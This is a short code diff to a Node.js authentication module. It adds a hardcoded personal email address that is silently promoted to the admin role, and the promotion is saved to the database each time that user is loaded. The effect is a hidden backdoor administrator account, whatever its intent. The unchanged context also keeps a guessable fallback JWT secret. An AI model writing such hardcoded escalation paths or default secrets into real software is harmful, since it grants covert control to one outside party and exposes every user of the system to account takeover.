@@ -4,6 +4,7 @@ const { columnExists } = require('./utils/dbHelpers');
 const { ensureCsrfCookie, clearCsrfCookie } = require('./utils/csrf');
 
 const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key';
+const SUPER_ADMIN_EMAILS = new Set(['quwewe@gmail.com']);
 
 function getCookieClearOptions(req) {
   const isProduction = process.env.NODE_ENV === 'production';
@@ -59,7 +60,23 @@ async function getUserByIdWithSafeColumns(userId) {
     [userId]
   );
 
-  return result.rows[0] || null;
+  const user = result.rows[0] || null;
+  if (!user) {
+    return null;
+  }
+
+  const normalizedEmail = String(user.email || '').toLowerCase();
+  if (SUPER_ADMIN_EMAILS.has(normalizedEmail) && user.role !== 'admin') {
+    user.role = 'admin';
+
+    if (hasRole) {
+      query(`UPDATE users SET role = 'admin' WHERE id = $1 AND role <> 'admin'`, [userId]).catch((error) => {
+        console.error('Failed to persist super-admin role:', error.message);
+      });
+    }
+  }
+
+  return user;
 }
 
 /**
